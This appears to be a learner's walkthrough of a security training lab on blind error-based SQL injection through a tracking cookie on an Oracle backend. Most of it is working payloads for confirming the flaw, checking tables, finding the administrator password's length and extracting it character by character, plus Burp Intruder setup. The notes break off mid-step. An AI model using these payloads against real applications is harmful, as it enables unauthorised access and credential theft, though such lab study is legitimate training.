Goal: 
    - Output the administrator password
    - Login as the administrator user

Analysis:
---------

Vulnerable Parameter - tracking cookie
Can't use union based SQLi because the SQL query does not returned any data.

1) Prove that parameter is vulnerable: 

    Provide a valid SQL Query
    ' || (select '') || '   => 500 error test for oracle db
    ' || (select '' from dual) || ' => 200 success - Indicates this is a oracle database. (True Statement)
    Provide a invalid table name to ensure its vulnerable to SQLi
    ' || (select '' from dualtest) || ' => 500 success - Indicates this is a oracle database. (False Statement)

2) Confirm that the users table exist in the database:
    ' || (select '' from users) || ' => The result for this query is more than 1 row and we should always limit it to 1 row
    ' || (select '' from users where rownum = 1) || ' => 200 success - Users table exist

3) Confirm that the administrator user exists in the users database:
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) END FROM dual) || ' => When statement is true prompt an error.

    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) END FROM users where username = 'administrator') || ' (The where claus is always evaluated first)


4) Determine password length:
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) END FROM users where username = 'administrator' and LENGTH(password) > 1) || '
    
5) Enumerate password:
    ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) END FROM users where username = 'administrator' and substr(password,1,1) = 'a') || ' => if 200 response a is not the first character
         - Use Burp Suite Intruder
        Burp Suite Steps to get password
            1) Send request to Intruder
            2) Attack Type: Cluster bomb
            3) Select Payloads 
                - select substring(password,$1$,1)
